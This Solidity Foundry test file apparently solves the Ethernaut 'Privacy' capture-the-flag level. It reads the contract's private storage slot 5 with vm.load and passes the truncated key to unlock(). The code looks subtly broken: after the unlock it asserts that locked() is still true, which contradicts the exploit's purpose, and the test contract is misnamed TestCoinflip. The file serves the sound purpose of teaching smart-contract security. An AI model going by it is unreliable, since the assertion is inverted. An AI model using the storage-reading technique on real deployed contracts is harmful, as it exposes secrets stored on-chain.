// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Privacy.sol";
import "../src/levels/PrivacyFactory.sol";
import "./utils/BaseTest.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";

contract TestCoinflip is BaseTest{
    using SafeMath for uint256;
    Privacy level;


    constructor() public{
        levelFactory = new PrivacyFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Privacy(levelAddress);
                
        assertEq(level.locked(), true);

    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        bytes32 key = vm.load(address(level),bytes32(uint256(5)));
        level.unlock(bytes16(key));
        assertEq(level.locked(),true);
        vm.stopPrank();
    }
}